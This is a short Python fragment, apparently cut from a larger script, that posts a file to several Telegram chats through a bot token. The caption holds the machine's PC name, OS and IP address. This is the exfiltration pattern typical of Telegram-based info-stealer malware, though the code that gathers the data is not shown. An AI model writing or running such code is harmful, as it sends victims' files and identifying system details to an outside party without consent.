chatIds = ["xxx","xxx","xxx"] 
for x in chatIds:
    resp = requests.post('https://api.telegram.org/bot' + bot_token + '/sendDocument?chat_id=' + x + '&caption=' +'\nPC = ' +sys +'\nOS = ' +OS +" "+number+'\nIP = ' +IP , files=files)
    print(x)
